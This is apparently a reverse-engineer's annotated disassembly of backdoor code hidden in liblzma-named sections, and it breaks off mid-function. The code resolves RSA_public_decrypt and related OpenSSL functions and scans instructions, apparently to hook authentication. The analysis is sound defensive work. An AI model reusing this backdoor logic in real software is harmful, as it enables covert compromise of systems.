.text.lzma_index_stream_flaga:0000000000004A30                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_index_stream_flaga:0000000000004A30
.text.lzma_index_stream_flaga:0000000000004A30 ; =============== S U B R O U T I N E =======================================
.text.lzma_index_stream_flaga:0000000000004A30
.text.lzma_index_stream_flaga:0000000000004A30
.text.lzma_index_stream_flaga:0000000000004A30 ; __int64 __fastcall process_shared_libraries(parse_lib *a1)
.text.lzma_index_stream_flaga:0000000000004A30                 public process_shared_libraries
.text.lzma_index_stream_flaga:0000000000004A30 process_shared_libraries proc near      ; CODE XREF: parse_elf_init+21E↓p
.text.lzma_index_stream_flaga:0000000000004A30
.text.lzma_index_stream_flaga:0000000000004A30 var_40          = parse_lib ptr -40h
.text.lzma_index_stream_flaga:0000000000004A30
.text.lzma_index_stream_flaga:0000000000004A30                 endbr64
.text.lzma_index_stream_flaga:0000000000004A34                 push    rbx
.text.lzma_index_stream_flaga:0000000000004A35                 mov     rbx, rdi
.text.lzma_index_stream_flaga:0000000000004A38                 mov     edx, 8C0h       ; a3
.text.lzma_index_stream_flaga:0000000000004A3D                 mov     esi, 5B0h       ; hash
.text.lzma_index_stream_flaga:0000000000004A42                 sub     rsp, 40h
.text.lzma_index_stream_flaga:0000000000004A46                 mov     rax, [rdi+8]
.text.lzma_index_stream_flaga:0000000000004A4A                 mov     rdi, [rax+8]    ; a1
.text.lzma_index_stream_flaga:0000000000004A4E                 call    import_lookup_get_str ; PIC mode
.text.lzma_index_stream_flaga:0000000000004A53                 xor     edx, edx
.text.lzma_index_stream_flaga:0000000000004A55                 test    rax, rax
.text.lzma_index_stream_flaga:0000000000004A58                 jz      short loc_4ABF
.text.lzma_index_stream_flaga:0000000000004A5A                 mov     rcx, [rbx+8]
.text.lzma_index_stream_flaga:0000000000004A5E                 mov     rax, [rax+8]
.text.lzma_index_stream_flaga:0000000000004A62                 mov     rdx, [rcx+8]
.text.lzma_index_stream_flaga:0000000000004A66                 add     rax, [rdx]
.text.lzma_index_stream_flaga:0000000000004A69                 xor     edx, edx
.text.lzma_index_stream_flaga:0000000000004A6B                 cmp     dword ptr [rax], 0
.text.lzma_index_stream_flaga:0000000000004A6E                 jle     short loc_4ABF
.text.lzma_index_stream_flaga:0000000000004A70                 mov     rdx, [rbx]
.text.lzma_index_stream_flaga:0000000000004A73                 mov     rdi, [rax+8]
.text.lzma_index_stream_flaga:0000000000004A77                 lea     rsi, [rsp+48h+var_40]
.text.lzma_index_stream_flaga:0000000000004A7C                 mov     [rsp+48h+var_40.infos], rcx
.text.lzma_index_stream_flaga:0000000000004A81                 mov     [rsp+48h+var_40.parser], rdx
.text.lzma_index_stream_flaga:0000000000004A86                 mov     rdx, [rbx+10h]
.text.lzma_index_stream_flaga:0000000000004A8A                 mov     [rsp+48h+var_40.RSA_public_decrypt], rdx
.text.lzma_index_stream_flaga:0000000000004A8F                 mov     rdx, [rbx+18h]
.text.lzma_index_stream_flaga:0000000000004A93                 mov     [rsp+48h+var_40.EVP_PKEY_set1_RSA], rdx
.text.lzma_index_stream_flaga:0000000000004A98                 mov     rdx, [rbx+20h]
.text.lzma_index_stream_flaga:0000000000004A9C                 mov     [rsp+48h+var_40.RSA_get0_key], rdx
.text.lzma_index_stream_flaga:0000000000004AA1                 mov     rdx, [rbx+28h]
.text.lzma_index_stream_flaga:0000000000004AA5                 mov     [rsp+48h+var_40.global_counter], rdx
.text.lzma_index_stream_flaga:0000000000004AAA                 mov     rdx, [rbx+30h]
.text.lzma_index_stream_flaga:0000000000004AAE                 mov     [rsp+48h+var_40.field_30], rdx
.text.lzma_index_stream_flaga:0000000000004AB3                 call    process_shared_libraries_map ; PIC mode
.text.lzma_index_stream_flaga:0000000000004AB8                 xor     edx, edx
.text.lzma_index_stream_flaga:0000000000004ABA                 test    eax, eax
.text.lzma_index_stream_flaga:0000000000004ABC                 setnz   dl
.text.lzma_index_stream_flaga:0000000000004ABF
.text.lzma_index_stream_flaga:0000000000004ABF loc_4ABF:                               ; CODE XREF: process_shared_libraries+28↑j
.text.lzma_index_stream_flaga:0000000000004ABF                                         ; process_shared_libraries+3E↑j
.text.lzma_index_stream_flaga:0000000000004ABF                 add     rsp, 40h
.text.lzma_index_stream_flaga:0000000000004AC3                 mov     eax, edx
.text.lzma_index_stream_flaga:0000000000004AC5                 pop     rbx
.text.lzma_index_stream_flaga:0000000000004AC6                 retn
.text.lzma_index_stream_flaga:0000000000004AC6 process_shared_libraries endp
.text.lzma_index_stream_flaga:0000000000004AC6
.text.lzma_index_stream_flaga:0000000000004AC6 _text_lzma_index_stream_flaga ends
.text.lzma_index_stream_flaga:0000000000004AC6
.text.lzma_index_iter_locata:0000000000004AD0 ; ===========================================================================
.text.lzma_index_iter_locata:0000000000004AD0
.text.lzma_index_iter_locata:0000000000004AD0 ; Segment type: Pure code
.text.lzma_index_iter_locata:0000000000004AD0 ; Segment permissions: Read/Execute
.text.lzma_index_iter_locata:0000000000004AD0 _text_lzma_index_iter_locata segment para public 'CODE' use64
.text.lzma_index_iter_locata:0000000000004AD0                 assume cs:_text_lzma_index_iter_locata
.text.lzma_index_iter_locata:0000000000004AD0                 ;org 4AD0h
.text.lzma_index_iter_locata:0000000000004AD0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_index_iter_locata:0000000000004AD0
.text.lzma_index_iter_locata:0000000000004AD0 ; =============== S U B R O U T I N E =======================================
.text.lzma_index_iter_locata:0000000000004AD0
.text.lzma_index_iter_locata:0000000000004AD0
.text.lzma_index_iter_locata:0000000000004AD0 ; __int64 __fastcall Llzma_index_iter_locate_1(__int64, __int64)
.text.lzma_index_iter_locata:0000000000004AD0 _Llzma_index_iter_locate_1 proc near    ; CODE XREF: _Llzma_index_hash_init_part_0+2C7↓p
.text.lzma_index_iter_locata:0000000000004AD0
.text.lzma_index_iter_locata:0000000000004AD0 var_A0          = qword ptr -0A0h
.text.lzma_index_iter_locata:0000000000004AD0 var_98          = qword ptr -98h
.text.lzma_index_iter_locata:0000000000004AD0 var_8D          = byte ptr -8Dh
.text.lzma_index_iter_locata:0000000000004AD0 var_8C          = dword ptr -8Ch
.text.lzma_index_iter_locata:0000000000004AD0 var_80          = qword ptr -80h
.text.lzma_index_iter_locata:0000000000004AD0 var_78          = qword ptr -78h
.text.lzma_index_iter_locata:0000000000004AD0 var_70          = dword ptr -70h
.text.lzma_index_iter_locata:0000000000004AD0 var_65          = byte ptr -65h
.text.lzma_index_iter_locata:0000000000004AD0 var_63          = byte ptr -63h
.text.lzma_index_iter_locata:0000000000004AD0 var_62          = byte ptr -62h
.text.lzma_index_iter_locata:0000000000004AD0 var_61          = byte ptr -61h
.text.lzma_index_iter_locata:0000000000004AD0 var_60          = byte ptr -60h
.text.lzma_index_iter_locata:0000000000004AD0 var_58          = dword ptr -58h
.text.lzma_index_iter_locata:0000000000004AD0 var_50          = qword ptr -50h
.text.lzma_index_iter_locata:0000000000004AD0 var_40          = qword ptr -40h
.text.lzma_index_iter_locata:0000000000004AD0
.text.lzma_index_iter_locata:0000000000004AD0                 endbr64
.text.lzma_index_iter_locata:0000000000004AD4                 push    r15
.text.lzma_index_iter_locata:0000000000004AD6                 mov     ecx, 9
.text.lzma_index_iter_locata:0000000000004ADB                 mov     edx, 1Fh
.text.lzma_index_iter_locata:0000000000004AE0                 push    r14
.text.lzma_index_iter_locata:0000000000004AE2                 push    r13
.text.lzma_index_iter_locata:0000000000004AE4                 mov     r13, rsi
.text.lzma_index_iter_locata:0000000000004AE7                 mov     esi, 97h
.text.lzma_index_iter_locata:0000000000004AEC                 push    r12
.text.lzma_index_iter_locata:0000000000004AEE                 mov     r12, rdi
.text.lzma_index_iter_locata:0000000000004AF1                 xor     edi, edi
.text.lzma_index_iter_locata:0000000000004AF3                 push    rbx
.text.lzma_index_iter_locata:0000000000004AF4                 add     rsp, 0FFFFFFFFFFFFFF80h
.text.lzma_index_iter_locata:0000000000004AF8                 call    apply_one_entry_ex ; PIC mode
.text.lzma_index_iter_locata:0000000000004AFD                 test    eax, eax
.text.lzma_index_iter_locata:0000000000004AFF                 jz      loc_4EBF
.text.lzma_index_iter_locata:0000000000004B05                 xor     eax, eax
.text.lzma_index_iter_locata:0000000000004B07                 lea     rdi, [rsp+0A8h+var_80]
.text.lzma_index_iter_locata:0000000000004B0C                 mov     ecx, 16h
.text.lzma_index_iter_locata:0000000000004B11                 mov     r15, [r13+0]
.text.lzma_index_iter_locata:0000000000004B15                 rep stosd
.text.lzma_index_iter_locata:0000000000004B17                 mov     edi, 1          ; _QWORD
.text.lzma_index_iter_locata:0000000000004B1C                 call    get_lzma_allocator ; PIC mode
.text.lzma_index_iter_locata:0000000000004B21                 mov     edi, 0C08h
.text.lzma_index_iter_locata:0000000000004B26                 mov     rbx, rax
.text.lzma_index_iter_locata:0000000000004B29                 mov     rax, [r12+8]
.text.lzma_index_iter_locata:0000000000004B2E                 mov     rsi, rbx
.text.lzma_index_iter_locata:0000000000004B31                 mov     rax, [rax+20h]
.text.lzma_index_iter_locata:0000000000004B35                 mov     [rbx+10h], rax
.text.lzma_index_iter_locata:0000000000004B39                 call    lzma_alloc      ; PIC mode
.text.lzma_index_iter_locata:0000000000004B3E                 mov     rdx, [r13+38h]
.text.lzma_index_iter_locata:0000000000004B42                 test    rax, rax
.text.lzma_index_iter_locata:0000000000004B45                 mov     [rdx+0A8h], rax
.text.lzma_index_iter_locata:0000000000004B4C                 lea     rax, [rsp+0A8h+var_80]
.text.lzma_index_iter_locata:0000000000004B51                 mov     [rsp+0A8h+var_98], rax
.text.lzma_index_iter_locata:0000000000004B56                 jz      short loc_4B5E
.text.lzma_index_iter_locata:0000000000004B58                 inc     dword ptr [rdx+120h]
.text.lzma_index_iter_locata:0000000000004B5E
.text.lzma_index_iter_locata:0000000000004B5E loc_4B5E:                               ; CODE XREF: _Llzma_index_iter_locate_1+86↑j
.text.lzma_index_iter_locata:0000000000004B5E                 mov     edi, 1          ; _QWORD
.text.lzma_index_iter_locata:0000000000004B63                 mov     r14, [rdx+118h]
.text.lzma_index_iter_locata:0000000000004B6A                 call    get_lzma_allocator ; PIC mode
.text.lzma_index_iter_locata:0000000000004B6F                 mov     edi, 348h
.text.lzma_index_iter_locata:0000000000004B74                 mov     [rsp+0A8h+var_A0], rax
.text.lzma_index_iter_locata:0000000000004B79                 mov     rax, [r12+8]
.text.lzma_index_iter_locata:0000000000004B7E                 mov     rsi, [rsp+0A8h+var_A0]
.text.lzma_index_iter_locata:0000000000004B83                 mov     rax, [rax+10h]
.text.lzma_index_iter_locata:0000000000004B87                 mov     [rsi+10h], rax
.text.lzma_index_iter_locata:0000000000004B8B                 call    lzma_alloc      ; PIC mode
.text.lzma_index_iter_locata:0000000000004B90                 mov     [r14+10h], rax
.text.lzma_index_iter_locata:0000000000004B94                 test    rax, rax
.text.lzma_index_iter_locata:0000000000004B97                 jz      short loc_4B9C
.text.lzma_index_iter_locata:0000000000004B99                 inc     dword ptr [r14]
.text.lzma_index_iter_locata:0000000000004B9C
.text.lzma_index_iter_locata:0000000000004B9C loc_4B9C:                               ; CODE XREF: _Llzma_index_iter_locate_1+C7↑j
.text.lzma_index_iter_locata:0000000000004B9C                 xor     r9d, r9d
.text.lzma_index_iter_locata:0000000000004B9F                 mov     r10b, 0FFh
.text.lzma_index_iter_locata:0000000000004BA2
.text.lzma_index_iter_locata:0000000000004BA2 loc_4BA2:                               ; CODE XREF: _Llzma_index_iter_locate_1+3BC↓j
.text.lzma_index_iter_locata:0000000000004BA2                 mov     rdx, [r13+8]
.text.lzma_index_iter_locata:0000000000004BA6                 cmp     r15, rdx
.text.lzma_index_iter_locata:0000000000004BA9                 jnb     loc_4E91
.text.lzma_index_iter_locata:0000000000004BAF                 mov     rdi, [rsp+0A8h+var_98]
.text.lzma_index_iter_locata:0000000000004BB4                 mov     rsi, r15
.text.lzma_index_iter_locata:0000000000004BB7                 mov     [rsp+0A8h+var_8C], r9d
.text.lzma_index_iter_locata:0000000000004BBC                 mov     [rsp+0A8h+var_8D], r10b
.text.lzma_index_iter_locata:0000000000004BC1                 call    code_dasm       ; PIC mode
.text.lzma_index_iter_locata:0000000000004BC6                 test    eax, eax
.text.lzma_index_iter_locata:0000000000004BC8                 jz      loc_4EBF
.text.lzma_index_iter_locata:0000000000004BCE                 mov     r9d, [rsp+0A8h+var_8C]
.text.lzma_index_iter_locata:0000000000004BD3                 mov     r10b, [rsp+0A8h+var_8D]
.text.lzma_index_iter_locata:0000000000004BD8                 test    r9d, r9d
.text.lzma_index_iter_locata:0000000000004BDB                 jnz     loc_4CE3
.text.lzma_index_iter_locata:0000000000004BE1                 cmp     [rsp+0A8h+var_58], 1036h
.text.lzma_index_iter_locata:0000000000004BE9                 jnz     loc_4E87
.text.lzma_index_iter_locata:0000000000004BEF                 mov     edi, [rsp+0A8h+var_70]
.text.lzma_index_iter_locata:0000000000004BF3                 mov     eax, edi
.text.lzma_index_iter_locata:0000000000004BF5                 and     ax, 140h
.text.lzma_index_iter_locata:0000000000004BF9                 cmp     ax, 140h
.text.lzma_index_iter_locata:0000000000004BFD                 jnz     loc_4E87
.text.lzma_index_iter_locata:0000000000004C03                 mov     al, [rsp+0A8h+var_63]
.text.lzma_index_iter_locata:0000000000004C07                 dec     eax
.text.lzma_index_iter_locata:0000000000004C09                 cmp     al, 1
.text.lzma_index_iter_locata:0000000000004C0B                 ja      loc_4E87
.text.lzma_index_iter_locata:0000000000004C11                 mov     dl, byte ptr [rsp+0A8h+var_70]
.text.lzma_index_iter_locata:0000000000004C15                 mov     sil, byte ptr [rsp+0A8h+var_70+1]
.text.lzma_index_iter_locata:0000000000004C1A                 mov     ecx, edx
.text.lzma_index_iter_locata:0000000000004C1C                 and     cl, 40h
.text.lzma_index_iter_locata:0000000000004C1F                 jnz     short loc_4C2C
.text.lzma_index_iter_locata:0000000000004C21                 xor     eax, eax
.text.lzma_index_iter_locata:0000000000004C23                 test    di, 1040h
.text.lzma_index_iter_locata:0000000000004C28                 jnz     short loc_4C6A
.text.lzma_index_iter_locata:0000000000004C2A                 jmp     short loc_4C8A
.text.lzma_index_iter_locata:0000000000004C2C ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004C2C
.text.lzma_index_iter_locata:0000000000004C2C loc_4C2C:                               ; CODE XREF: _Llzma_index_iter_locate_1+14F↑j
.text.lzma_index_iter_locata:0000000000004C2C                 mov     eax, edx
.text.lzma_index_iter_locata:0000000000004C2E                 mov     cl, [rsp+0A8h+var_61]
.text.lzma_index_iter_locata:0000000000004C32                 and     al, 20h
.text.lzma_index_iter_locata:0000000000004C34                 jnz     short loc_4C43
.text.lzma_index_iter_locata:0000000000004C36                 test    di, 1040h
.text.lzma_index_iter_locata:0000000000004C3B                 jz      short loc_4C8A
.text.lzma_index_iter_locata:0000000000004C3D                 mov     al, [rsp+0A8h+var_62]
.text.lzma_index_iter_locata:0000000000004C41                 jmp     short loc_4C8A
.text.lzma_index_iter_locata:0000000000004C43 ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004C43
.text.lzma_index_iter_locata:0000000000004C43 loc_4C43:                               ; CODE XREF: _Llzma_index_iter_locate_1+164↑j
.text.lzma_index_iter_locata:0000000000004C43                 movzx   edx, [rsp+0A8h+var_65]
.text.lzma_index_iter_locata:0000000000004C48                 lea     eax, ds:0[rdx*8]
.text.lzma_index_iter_locata:0000000000004C4F                 and     eax, 8
.text.lzma_index_iter_locata:0000000000004C52                 or      ecx, eax
.text.lzma_index_iter_locata:0000000000004C54                 xor     eax, eax
.text.lzma_index_iter_locata:0000000000004C56                 test    di, 1040h
.text.lzma_index_iter_locata:0000000000004C5B                 jz      short loc_4C8A
.text.lzma_index_iter_locata:0000000000004C5D                 mov     al, [rsp+0A8h+var_62]
.text.lzma_index_iter_locata:0000000000004C61                 add     edx, edx
.text.lzma_index_iter_locata:0000000000004C63                 and     edx, 8
.text.lzma_index_iter_locata:0000000000004C66                 or      eax, edx
.text.lzma_index_iter_locata:0000000000004C68                 jmp     short loc_4C8A
.text.lzma_index_iter_locata:0000000000004C6A ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004C6A
.text.lzma_index_iter_locata:0000000000004C6A loc_4C6A:                               ; CODE XREF: _Llzma_index_iter_locate_1+158↑j
.text.lzma_index_iter_locata:0000000000004C6A                 mov     eax, esi
.text.lzma_index_iter_locata:0000000000004C6C                 and     al, 10h
.text.lzma_index_iter_locata:0000000000004C6E                 jz      short loc_4C8A
.text.lzma_index_iter_locata:0000000000004C70                 and     dl, 20h
.text.lzma_index_iter_locata:0000000000004C73                 mov     al, [rsp+0A8h+var_60]
.text.lzma_index_iter_locata:0000000000004C77                 jz      short loc_4C88
.text.lzma_index_iter_locata:0000000000004C79                 movzx   edx, [rsp+0A8h+var_65]
.text.lzma_index_iter_locata:0000000000004C7E                 shl     edx, 3
.text.lzma_index_iter_locata:0000000000004C81                 and     edx, 8
.text.lzma_index_iter_locata:0000000000004C84                 or      eax, edx
.text.lzma_index_iter_locata:0000000000004C86                 jmp     short loc_4C8A
.text.lzma_index_iter_locata:0000000000004C88 ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004C88
.text.lzma_index_iter_locata:0000000000004C88 loc_4C88:                               ; CODE XREF: _Llzma_index_iter_locate_1+1A7↑j
.text.lzma_index_iter_locata:0000000000004C88                 xor     ecx, ecx
.text.lzma_index_iter_locata:0000000000004C8A
.text.lzma_index_iter_locata:0000000000004C8A loc_4C8A:                               ; CODE XREF: _Llzma_index_iter_locate_1+15A↑j
.text.lzma_index_iter_locata:0000000000004C8A                                         ; _Llzma_index_iter_locate_1+16B↑j ...
.text.lzma_index_iter_locata:0000000000004C8A                 xor     edx, edx
.text.lzma_index_iter_locata:0000000000004C8C                 and     sil, 1
.text.lzma_index_iter_locata:0000000000004C90                 mov     rdi, [rsp+0A8h+var_78]
.text.lzma_index_iter_locata:0000000000004C95                 jz      short loc_4CB6
.text.lzma_index_iter_locata:0000000000004C97                 mov     esi, [rsp+44h]
.text.lzma_index_iter_locata:0000000000004C9B                 mov     rdx, [rsp+0A8h+var_50]
.text.lzma_index_iter_locata:0000000000004CA0                 and     esi, 0FF00FF00h
.text.lzma_index_iter_locata:0000000000004CA6                 cmp     esi, 5000000h
.text.lzma_index_iter_locata:0000000000004CAC                 jnz     short loc_4CB6
.text.lzma_index_iter_locata:0000000000004CAE                 add     rdx, [rsp+0A8h+var_80]
.text.lzma_index_iter_locata:0000000000004CB3                 add     rdx, rdi
.text.lzma_index_iter_locata:0000000000004CB6
.text.lzma_index_iter_locata:0000000000004CB6 loc_4CB6:                               ; CODE XREF: _Llzma_index_iter_locate_1+1C5↑j
.text.lzma_index_iter_locata:0000000000004CB6                                         ; _Llzma_index_iter_locate_1+1DC↑j
.text.lzma_index_iter_locata:0000000000004CB6                 mov     esi, [r13+10h]
.text.lzma_index_iter_locata:0000000000004CBA                 cmp     rsi, rdx
.text.lzma_index_iter_locata:0000000000004CBD                 jnz     loc_4E87
.text.lzma_index_iter_locata:0000000000004CC3                 mov     rsi, [r13+20h]
.text.lzma_index_iter_locata:0000000000004CC7                 movzx   edx, word ptr [rsi]
.text.lzma_index_iter_locata:0000000000004CCA                 sar     edx, cl
.text.lzma_index_iter_locata:0000000000004CCC                 and     dl, 1
.text.lzma_index_iter_locata:0000000000004CCF                 jz      loc_4E87
.text.lzma_index_iter_locata:0000000000004CD5                 mov     [rsi+2], al
.text.lzma_index_iter_locata:0000000000004CD8                 mov     r9d, 1
.text.lzma_index_iter_locata:0000000000004CDE                 jmp     loc_4E87
.text.lzma_index_iter_locata:0000000000004CE3 ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004CE3
.text.lzma_index_iter_locata:0000000000004CE3 loc_4CE3:                               ; CODE XREF: _Llzma_index_iter_locate_1+10B↑j
.text.lzma_index_iter_locata:0000000000004CE3                 cmp     r9d, 1
.text.lzma_index_iter_locata:0000000000004CE7                 jnz     loc_4DC5
.text.lzma_index_iter_locata:0000000000004CED                 mov     esi, [rsp+0A8h+var_58]
.text.lzma_index_iter_locata:0000000000004CF1                 mov     eax, esi
.text.lzma_index_iter_locata:0000000000004CF3                 and     eax, 0FFFFFFFDh
.text.lzma_index_iter_locata:0000000000004CF6                 cmp     eax, 89h
.text.lzma_index_iter_locata:0000000000004CFB                 jnz     loc_4E87
.text.lzma_index_iter_locata:0000000000004D01                 mov     cl, byte ptr [rsp+0A8h+var_70]
.text.lzma_index_iter_locata:0000000000004D05                 mov     rdi, [r13+18h]
.text.lzma_index_iter_locata:0000000000004D09                 mov     edx, ecx
.text.lzma_index_iter_locata:0000000000004D0B                 and     edx, 40h
.text.lzma_index_iter_locata:0000000000004D0E                 test    word ptr [rsp+0A8h+var_70], 1040h
.text.lzma_index_iter_locata:0000000000004D15                 jz      short loc_4D60
.text.lzma_index_iter_locata:0000000000004D17                 test    dl, dl
.text.lzma_index_iter_locata:0000000000004D19                 jz      short loc_4D32
.text.lzma_index_iter_locata:0000000000004D1B                 mov     al, [rsp+0A8h+var_62]
.text.lzma_index_iter_locata:0000000000004D1F                 test    cl, 20h
.text.lzma_index_iter_locata:0000000000004D22                 jz      short loc_4D73
.text.lzma_index_iter_locata:0000000000004D24                 movzx   edx, [rsp+0A8h+var_65]
.text.lzma_index_iter_locata:0000000000004D29                 add     edx, edx
.text.lzma_index_iter_locata:0000000000004D2B                 and     edx, 8
.text.lzma_index_iter_locata:0000000000004D2E                 or      eax, edx
.text.lzma_index_iter_locata:0000000000004D30                 jmp     short loc_4D73
.text.lzma_index_iter_locata:0000000000004D32 ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004D32
.text.lzma_index_iter_locata:0000000000004D32 loc_4D32:                               ; CODE XREF: _Llzma_index_iter_locate_1+249↑j
.text.lzma_index_iter_locata:0000000000004D32                 test    byte ptr [rsp+0A8h+var_70+1], 10h
.text.lzma_index_iter_locata:0000000000004D37                 jnz     short loc_4D48
.text.lzma_index_iter_locata:0000000000004D39                 mov     cl, [rdi+2]
.text.lzma_index_iter_locata:0000000000004D3C                 test    cl, cl
.text.lzma_index_iter_locata:0000000000004D3E                 jnz     loc_4E87
.text.lzma_index_iter_locata:0000000000004D44                 xor     eax, eax
.text.lzma_index_iter_locata:0000000000004D46                 jmp     short loc_4D90
.text.lzma_index_iter_locata:0000000000004D48 ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004D48
.text.lzma_index_iter_locata:0000000000004D48 loc_4D48:                               ; CODE XREF: _Llzma_index_iter_locate_1+267↑j
.text.lzma_index_iter_locata:0000000000004D48                 and     cl, 20h
.text.lzma_index_iter_locata:0000000000004D4B                 mov     al, [rsp+0A8h+var_60]
.text.lzma_index_iter_locata:0000000000004D4F                 jz      short loc_4D89
.text.lzma_index_iter_locata:0000000000004D51                 movzx   ecx, [rsp+0A8h+var_65]
.text.lzma_index_iter_locata:0000000000004D56                 shl     ecx, 3
.text.lzma_index_iter_locata:0000000000004D59                 and     ecx, 8
.text.lzma_index_iter_locata:0000000000004D5C                 or      eax, ecx
.text.lzma_index_iter_locata:0000000000004D5E                 jmp     short loc_4D89
.text.lzma_index_iter_locata:0000000000004D60 ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004D60
.text.lzma_index_iter_locata:0000000000004D60 loc_4D60:                               ; CODE XREF: _Llzma_index_iter_locate_1+245↑j
.text.lzma_index_iter_locata:0000000000004D60                 xor     eax, eax
.text.lzma_index_iter_locata:0000000000004D62                 test    dl, dl
.text.lzma_index_iter_locata:0000000000004D64                 jnz     short loc_4D73
.text.lzma_index_iter_locata:0000000000004D66                 mov     cl, [rdi+2]
.text.lzma_index_iter_locata:0000000000004D69                 test    cl, cl
.text.lzma_index_iter_locata:0000000000004D6B                 jnz     loc_4E87
.text.lzma_index_iter_locata:0000000000004D71                 jmp     short loc_4D90
.text.lzma_index_iter_locata:0000000000004D73 ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004D73
.text.lzma_index_iter_locata:0000000000004D73 loc_4D73:                               ; CODE XREF: _Llzma_index_iter_locate_1+252↑j
.text.lzma_index_iter_locata:0000000000004D73                                         ; _Llzma_index_iter_locate_1+260↑j ...
.text.lzma_index_iter_locata:0000000000004D73                 and     cl, 20h
.text.lzma_index_iter_locata:0000000000004D76                 mov     dl, [rsp+0A8h+var_61]
.text.lzma_index_iter_locata:0000000000004D7A                 jz      short loc_4D89
.text.lzma_index_iter_locata:0000000000004D7C                 movzx   ecx, [rsp+0A8h+var_65]
.text.lzma_index_iter_locata:0000000000004D81                 shl     ecx, 3
.text.lzma_index_iter_locata:0000000000004D84                 and     ecx, 8
.text.lzma_index_iter_locata:0000000000004D87                 or      edx, ecx
.text.lzma_index_iter_locata:0000000000004D89
.text.lzma_index_iter_locata:0000000000004D89 loc_4D89:                               ; CODE XREF: _Llzma_index_iter_locate_1+27F↑j
.text.lzma_index_iter_locata:0000000000004D89                                         ; _Llzma_index_iter_locate_1+28E↑j ...
.text.lzma_index_iter_locata:0000000000004D89                 mov     cl, [rdi+2]
.text.lzma_index_iter_locata:0000000000004D8C                 cmp     cl, al
.text.lzma_index_iter_locata:0000000000004D8E                 jnz     short loc_4D99
.text.lzma_index_iter_locata:0000000000004D90
.text.lzma_index_iter_locata:0000000000004D90 loc_4D90:                               ; CODE XREF: _Llzma_index_iter_locate_1+276↑j
.text.lzma_index_iter_locata:0000000000004D90                                         ; _Llzma_index_iter_locate_1+2A1↑j
.text.lzma_index_iter_locata:0000000000004D90                 mov     rdi, [r13+20h]
.text.lzma_index_iter_locata:0000000000004D94                 cmp     [rdi+2], dl
.text.lzma_index_iter_locata:0000000000004D97                 jz      short loc_4DAE
.text.lzma_index_iter_locata:0000000000004D99
.text.lzma_index_iter_locata:0000000000004D99 loc_4D99:                               ; CODE XREF: _Llzma_index_iter_locate_1+2BE↑j
.text.lzma_index_iter_locata:0000000000004D99                 cmp     dl, cl
.text.lzma_index_iter_locata:0000000000004D9B                 jnz     loc_4E87
.text.lzma_index_iter_locata:0000000000004DA1                 mov     rcx, [r13+20h]
.text.lzma_index_iter_locata:0000000000004DA5                 cmp     [rcx+2], al
.text.lzma_index_iter_locata:0000000000004DA8                 jnz     loc_4E87
.text.lzma_index_iter_locata:0000000000004DAE
.text.lzma_index_iter_locata:0000000000004DAE loc_4DAE:                               ; CODE XREF: _Llzma_index_iter_locate_1+2C7↑j
.text.lzma_index_iter_locata:0000000000004DAE                 cmp     esi, 89h
.text.lzma_index_iter_locata:0000000000004DB4                 mov     r9d, 2
.text.lzma_index_iter_locata:0000000000004DBA                 cmovnz  edx, eax
.text.lzma_index_iter_locata:0000000000004DBD                 mov     r10d, edx
.text.lzma_index_iter_locata:0000000000004DC0                 jmp     loc_4E87
.text.lzma_index_iter_locata:0000000000004DC5 ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004DC5
.text.lzma_index_iter_locata:0000000000004DC5 loc_4DC5:                               ; CODE XREF: _Llzma_index_iter_locate_1+217↑j
.text.lzma_index_iter_locata:0000000000004DC5                 cmp     r9d, 2
.text.lzma_index_iter_locata:0000000000004DC9                 jnz     loc_4E87
.text.lzma_index_iter_locata:0000000000004DCF                 mov     eax, [rsp+0A8h+var_58]
.text.lzma_index_iter_locata:0000000000004DD3                 cmp     eax, 128h
.text.lzma_index_iter_locata:0000000000004DD8                 jz      short loc_4E35
.text.lzma_index_iter_locata:0000000000004DDA                 cmp     eax, 176h
.text.lzma_index_iter_locata:0000000000004DDF                 jnz     loc_4E87
.text.lzma_index_iter_locata:0000000000004DE5                 mov     al, [rsp+0A8h+var_62]
.text.lzma_index_iter_locata:0000000000004DE9                 test    al, al
.text.lzma_index_iter_locata:0000000000004DEB                 jnz     loc_4E87
.text.lzma_index_iter_locata:0000000000004DF1                 test    word ptr [rsp+0A8h+var_70], 1040h
.text.lzma_index_iter_locata:0000000000004DF8                 jz      short loc_4E37
.text.lzma_index_iter_locata:0000000000004DFA                 mov     dl, byte ptr [rsp+0A8h+var_70]
.text.lzma_index_iter_locata:0000000000004DFE                 test    dl, 40h
.text.lzma_index_iter_locata:0000000000004E01                 jz      short loc_4E15
.text.lzma_index_iter_locata:0000000000004E03                 mov     eax, edx
.text.lzma_index_iter_locata:0000000000004E05                 and     al, 20h
.text.lzma_index_iter_locata:0000000000004E07                 jz      short loc_4E37
.text.lzma_index_iter_locata:0000000000004E09                 movzx   eax, [rsp+0A8h+var_65]
.text.lzma_index_iter_locata:0000000000004E0E                 add     eax, eax
.text.lzma_index_iter_locata:0000000000004E10                 and     eax, 8
.text.lzma_index_iter_locata:0000000000004E13                 jmp     short loc_4E37
.text.lzma_index_iter_locata:0000000000004E15 ; ---------------------------------------------------------------------------
.text.lzma_index_iter_locata:0000000000004E15
.text.lzma_index_iter_locata:0000000000004E15 loc_4E15:                               ; CODE XREF: _Llzma_index_iter_locate_1+331↑j
.text.lzma_index_iter_locata:0000000000004E15                 mov     al, byte ptr [rsp+0A8h+var_70+1]
.text.lzma_index_iter_locata:0000000000004E19                 and     al, 10h
.text.lzma_index_iter_locata:0000000000004E1B                 jz      short loc_4E37
.text.lzma_index_iter_locata:0000000000004E1D                 and     dl, 20h
.text.lzma_index_iter_locata:0000000000004E20                 mov     al, [rsp+0A8h+var_60]
.text.lzma_index_iter_locata:0000000000004E24                 jz      short loc_4E37
.text.lzma_index_iter_locata:0000000000004E26                 movzx   edx, [rsp+0A8h+var_65]
.text.lzma_index_iter_locata:0000000000004E2B                 shl     edx, 3
